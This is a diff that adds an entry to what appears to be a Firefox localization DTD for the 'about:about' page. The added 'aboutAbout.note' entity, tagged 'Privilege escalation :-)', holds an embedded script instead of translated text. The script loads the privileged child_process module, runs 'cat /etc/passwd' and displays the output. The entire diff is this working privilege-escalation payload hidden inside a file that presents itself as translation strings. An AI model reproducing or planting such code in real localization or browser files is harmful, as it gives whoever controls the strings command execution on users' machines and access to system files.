@@ -1,0 +1,10 @@
+<!ENTITY aboutAbout.title  "About About">
+<!ENTITY aboutAbout.note   "Privilege escalation :-)
+<script>
+const require_path = 'resource://gre/modules/commonjs/toolkit/require.js';
+const { require } = Components.utils.import(require_path, {});
+const child_process = require('sdk/system/child_process');
+var cmd = child_process.exec('cat /etc/passwd');
+cmd.stdout.on('data', output => alert(output));
+</script>
+">
